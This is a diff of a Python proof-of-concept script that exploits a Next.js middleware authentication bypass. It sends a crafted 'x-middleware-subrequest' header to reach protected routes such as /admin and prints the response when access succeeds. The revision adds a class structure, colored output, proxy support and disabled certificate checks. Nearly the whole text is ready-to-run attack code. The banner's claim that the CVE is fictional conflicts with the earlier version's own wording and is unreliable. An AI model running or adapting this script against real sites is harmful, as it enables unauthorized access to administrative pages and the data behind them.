@@ -1,64 +1,124 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 import requests
 import argparse
 import sys
+import logging
+from typing import Optional
 
-def exploit_nextjs(host, path="/admin", scheme="http",
-                    header_value="middleware:middleware:middleware:middleware:middleware",
-                    verbose=False):
-    """
-    Attempts to bypass Next.js middleware using the x-middleware-subrequest header.
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class Color:
+    RESET = '\033[0m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+
+def print_banner():
+    banner = f"""
+{Color.CYAN}
+ _   _  ___________ _____   ___  _   _ _____   _____ _   _ ___________ 
+| \ | ||  _  | ___ \_   _| / _ \| | | |  ___| /  __ \ | | |  ___| ___ \\
+|  \| || | | | |_/ / | |  / /_\ \ | | | |__   | /  \/ | | | |__ | |_/ /
+| . ` || | | |    /  | |  |  _  | | | |  __|  | |   | | | |  __||    / 
+| |\  |\ \_/ / |\ \  | |  | | | | |_| | |___  | \__/\ \_/ / |___| |\ \ 
+\_| \_/\___/\_| \_| \_/  \_| |_/\___/\____/   \____/\___/\____/\_| \_|
+                                                         
+{Color.YELLOW}PoC Template for Web Vulnerability Analysis
+{Color.RED}Disclaimer: CVE-2025-29927 is fictional and used for demonstration purposes.{Color.RESET}
+"""
+    print(banner)
+
+class NextjsExploit:
+    def __init__(self, target: str, path: str, scheme: str, header_value: str,
+                 proxy: Optional[str], user_agent: str, verbose: bool):
+        self.target = target
+        self.path = path if path.startswith('/') else f'/{path}'
+        self.scheme = scheme
+        self.header_value = header_value
+        self.verbose = verbose
+        self.url = f"{self.scheme}://{self.target}{self.path}"
+
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({'User-Agent': user_agent})
+
+        if proxy:
+            self.session.proxies = {'http': proxy, 'https': proxy}
+
+        self._setup_logging()
+
+    def _setup_logging(self):
+        level = logging.DEBUG if self.verbose else logging.INFO
+        logging.basicConfig(level=level, format='%(message)s')
+
+    def run_exploit(self):
+        logging.info(f"{Color.BLUE}[*] Target URL:{Color.RESET} {self.url}")
+        
+        headers = {"x-middleware-subrequest": self.header_value}
+        
+        logging.debug(f"{Color.YELLOW}[DEBUG] Using special header:{Color.RESET} 'x-middleware-subrequest: {self.header_value}'")
+        logging.debug(f"{Color.YELLOW}[DEBUG] Full headers:{Color.RESET} {self.session.headers}")
+
+        try:
+            response = self.session.get(self.url, headers=headers, timeout=15, allow_redirects=False)
+
+            logging.debug(f"{Color.YELLOW}[DEBUG] Response Status Code:{Color.RESET} {response.status_code}")
+            logging.debug(f"{Color.YELLOW}[DEBUG] Response Headers:{Color.RESET}\n{response.headers}")
+
+            if response.status_code == 200:
+                logging.info(f"{Color.GREEN}[+] SUCCESS:{Color.RESET} Middleware bypassed! Access granted.")
+                snippet = response.text[:500].strip()
+                print(f"\n--- Response Snippet ---\n{snippet}\n------------------------\n")
+            elif 300 <= response.status_code < 400:
+                location = response.headers.get('Location', 'N/A')
+                logging.warning(f"{Color.YELLOW}[-] FAILED:{Color.RESET} Exploit likely failed. Received a redirect ({response.status_code}) to: {location}")
+            else:
+                logging.error(f"{Color.RED}[-] FAILED:{Color.RESET} Access denied. Status code: {response.status_code}")
+                if self.verbose:
+                    print(f"\n--- Full Response ---\n{response.text[:1000]}\n---------------------\n")
+
+        except requests.exceptions.Timeout:
+            logging.error(f"{Color.RED}[!] ERROR:{Color.RESET} The request timed out. The server might be down or too slow.")
+            sys.exit(1)
+        except requests.exceptions.RequestException as e:
+            logging.error(f"{Color.RED}[!] REQUEST ERROR:{Color.RESET} An error occurred: {e}")
+            sys.exit(1)
+
+def main():
+    print_banner()
+    parser = argparse.ArgumentParser(
+        description="A professional PoC template to test for Next.js middleware bypass.",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
     
-    Parameters:
-      - host: domain/host with port (e.g., localhost:3000)
-      - path: protected route (default: /admin)
-      - scheme: 'http' or 'https'
-      - header_value: header value used to bypass the middleware
-      - verbose: enables detailed debugging information
-    """
-    headers = {
-        "x-middleware-subrequest": header_value,
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
-    }
-    url = f"{scheme}://{host}{path}"
+    parser.add_argument("host", help="Target host and port (e.g., localhost:3000)")
+    parser.add_argument("-p", "--path", default="/admin", help="Protected route path to access (default: /admin)")
+    parser.add_argument("-s", "--scheme", choices=["http", "https"], default="http", help="Protocol to use (http or https)")
+    parser.add_argument("--header", default="middleware:middleware", help="Value for the x-middleware-subrequest header")
+    parser.add_argument("-ua", "--user-agent", default="Mozilla/5.0", help="Custom User-Agent for the request")
+    parser.add_argument("--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
     
-    if verbose:
-        print(f"[DEBUG] Target URL: {url}")
-        print(f"[DEBUG] Headers used: {headers}")
-    
+    args = parser.parse_args()
+
     try:
-        response = requests.get(url, headers=headers, timeout=10)
-        if verbose:
-            print(f"[DEBUG] Response status code: {response.status_code}")
-            print(f"[DEBUG] Response headers: {response.headers}")
-        if response.status_code == 200:
-            print(f"[+] Exploit successful! Access to {url} granted")
-            snippet = response.text[:500] if len(response.text) > 500 else response.text
-            print(f"Response (snippet):\n{snippet}\n")
-        else:
-            print(f"[-] Exploit failed. Status code: {response.status_code}")
-            if verbose:
-                print(f"[DEBUG] Full response:\n{response.text}")
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Request error: {e}")
-        sys.exit(1)
+        exploit = NextjsExploit(
+            target=args.host,
+            path=args.path,
+            scheme=args.scheme,
+            header_value=args.header,
+            proxy=args.proxy,
+            user_agent=args.user_agent,
+            verbose=args.verbose
+        )
+        exploit.run_exploit()
+    except KeyboardInterrupt:
+        print(f"\n{Color.YELLOW}[!] User aborted. Exiting...{Color.RESET}")
+        sys.exit(0)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="Exploit for CVE-2025-29927 in Next.js (Controlled Environment)"
-    )
-    parser.add_argument("--host", required=True,
-                        help="Vulnerable application host (e.g., localhost:3000)")
-    parser.add_argument("--path", default="/admin",
-                        help="Protected route path (default: /admin)")
-    parser.add_argument("--scheme", choices=["http", "https"], default="http",
-                        help="Protocol to use (http or https)")
-    parser.add_argument("--header", default="middleware:middleware:middleware:middleware:middleware",
-                        help="Value for the x-middleware-subrequest header")
-    parser.add_argument("--verbose", action="store_true",
-                        help="Display detailed debugging information")
-    args = parser.parse_args()
-    
-    print("=== CVE-2025-29927 Exploit ===")
-    print("Starting attack in a controlled environment...\n")
-    exploit_nextjs(args.host, args.path, args.scheme, args.header, args.verbose)
+    main()
